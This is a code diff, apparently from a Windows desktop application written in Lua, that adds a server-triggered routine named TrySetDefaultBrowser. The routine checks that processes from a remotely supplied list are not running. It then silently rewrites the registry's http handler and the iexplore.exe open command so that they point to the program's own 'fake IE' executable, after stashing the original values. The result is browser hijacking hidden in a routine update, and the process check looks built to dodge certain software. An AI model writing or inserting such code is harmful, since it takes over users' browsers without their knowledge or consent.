@@ -248,6 +248,98 @@ function TryExecuteExtraCode(tServerConfig)
 end
 
 
+function TrySetDefaultBrowser(tServerConfig)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
+	
+	local tDefaultBrowser = tServerConfig["tDefaultBrowser"]
+	if type(tDefaultBrowser) ~= "table" then
+		return
+	end
+	
+	local nSpanTimeInSec = tDefaultBrowser["nSpanTimeInSec"] or 0
+	local nLastSetDefaultUTC = tUserConfig["nLastSetDefaultUTC"] or 0
+	local bPassCheck = CheckSpanTime(nLastSetDefaultUTC, nSpanTimeInSec)
+	if not bPassCheck then
+		FunctionObj.TipLog("[TrySetDefaultBrowser] CheckSpanTime failed")
+		return 
+	end
+	
+	local strBrowserList = tDefaultBrowser["strBrowserList"] or ""
+	local bPassCheck = CheckProcessList(strBrowserList)
+	if not bPassCheck then
+		FunctionObj.TipLog("[TrySetDefaultBrowser] CheckProcessList failed")
+		return 
+	end
+	
+	DoSetDefaultBrowser()
+	
+	tUserConfig["nLastSetDefaultUTC"] = tipUtil:GetCurrentUTCTime()
+	FunctionObj.SaveConfigToFileByKey("tUserConfig")
+end
+
+
+function CheckSpanTime(nLastRecordTime, nSpanTimeInSec)
+	if tonumber(nLastRecordTime) == nil or tonumber(nLastRecordTime) == 0 
+		or tonumber(nSpanTimeInSec) == nil or tonumber(nSpanTimeInSec) == 0 then
+		return true
+	end
+
+	local nCurrentTime = tipUtil:GetCurrentUTCTime()
+	if math.abs(nCurrentTime-nLastRecordTime) > nSpanTimeInSec then
+		return true
+	else
+		return false
+	end
+end
+
+
+function CheckProcessList(strProcessList)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local tProcessList = FunctionObj.SplitStringBySeperator(strProcessList) or {}
+	
+	for _, strProcessName in pairs(tProcessList) do
+		local strExeName = strProcessName..".exe"
+		local bExists = tipUtil:QueryProcessExists(strExeName)
+		if bExists then
+			FunctionObj.TipLog("[CheckProcessList] find process: "..tostring(strExeName))
+			return false
+		end
+	end
+	
+	return true
+end
+
+
+function DoSetDefaultBrowser()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local strFakeIEPath = FunctionObj.GetExePath()
+	local strDefBrowRegPath = "HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\"
+	local strOldDefBrowPath = FunctionObj.RegQueryValue(strDefBrowRegPath)
+	
+	if IsRealString(strOldDefBrowPath) and string.find(strOldDefBrowPath, strFakeIEPath) then
+		FunctionObj.TipLog("[DoSetDefaultBrowser] has set default browser -- http")
+		return
+	end
+
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRHttp", strOldDefBrowPath)
+	
+	local strCommand = "\""..strFakeIEPath.."\" /openlink %1"
+	FunctionObj.RegSetValue(strDefBrowRegPath, strCommand)
+	
+	------
+	local strIERegPath = "HKEY_CLASSES_ROOT\\Applications\\iexplore.exe\\shell\\open\\command\\"
+	local strOldIEPath = FunctionObj.RegQueryValue(strIERegPath)
+	if IsRealString(strOldIEPath) and string.find(strOldIEPath, strFakeIEPath) then
+		FunctionObj.TipLog("[DoSetDefaultBrowser] has set default browser -- Applications")
+		return
+	end
+	
+	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRAppIE", strOldIEPath)
+	FunctionObj.RegSetValue(strIERegPath, strFakeIEPath)
+end
+
+
 function FixUserConfig(tServerConfig)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
@@ -282,6 +374,7 @@ function AnalyzeServerConfig(nDownServer, strServerPath)
 	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
 	TryForceUpdate(tServerConfig)
 	FixUserConfig(tServerConfig)
+	TrySetDefaultBrowser(tServerConfig)
 	TryExecuteExtraCode(tServerConfig)
 end
 
